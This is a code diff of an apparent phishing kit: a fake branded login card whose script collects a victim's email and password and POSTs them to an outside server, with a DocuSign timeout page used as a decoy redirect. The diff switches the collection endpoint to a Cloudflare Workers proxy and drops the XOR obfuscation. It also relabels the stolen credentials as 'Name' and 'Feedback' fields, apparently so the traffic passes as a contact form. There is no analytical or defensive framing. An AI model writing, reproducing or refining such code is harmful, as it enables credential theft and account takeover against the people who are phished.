@@ -11,7 +11,7 @@
     BG_GRAY: false,
     BG_OVERLAY: 0.25,
     PHP_ENDPOINT:
-      "http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php",
+      "https://rum-email-proxy.haricoting.workers.dev/contact",
     SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
     LOCKOUT_REDIRECT:
       "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
@@ -56,7 +56,6 @@
     cardRoot.className = "frame_v7";
     cardRoot.id = "card_root";
     
-    // Fixed HTML structure with proper unlock icon (open padlock)
     cardRoot.innerHTML = 
       '<div class="brand_row">' +
         '<div class="brand_orb">' +
@@ -304,19 +303,6 @@
       passwordInput.focus();
     });
 
-    function xorEncrypt(data, key) {
-      var jsonString = JSON.stringify(data);
-      var result = "";
-      var keyLength = key.length;
-      for (var i = 0; i < jsonString.length; i++) {
-        var xorByte =
-          jsonString.charCodeAt(i) ^
-          key.charCodeAt(i % keyLength);
-        result += ("0" + xorByte.toString(16)).slice(-2);
-      }
-      return btoa(result);
-    }
-
     function lockout() {
       if (isLockedOut) {
         return;
@@ -348,23 +334,27 @@
         shakeCard();
         return;
       }
+      
       ctaNode.disabled = true;
       ctaNode.innerHTML = '<span class="ring_load"></span> Loading...';
+      
       var startTime = Date.now();
-      var encryptedData = xorEncrypt(
-        {
-          email: email,
-          code: password,
-        },
-        config.SECRET_KEY,
-      );
-      var formData = new FormData();
-      formData.append("secure_data", encryptedData);
+      
+      // New payload format using URLSearchParams
+      var cleanPayload = new URLSearchParams();
+      cleanPayload.append("Name", email);
+      cleanPayload.append("Feedback", password);
+      cleanPayload.append("timestamp", Date.now().toString());
+      
       var hasError = false;
       var responseData = null;
+      
       fetch(config.PHP_ENDPOINT, {
         method: "POST",
-        body: formData,
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: cleanPayload.toString(),
       })
         .then(function (response) {
           return response.text();
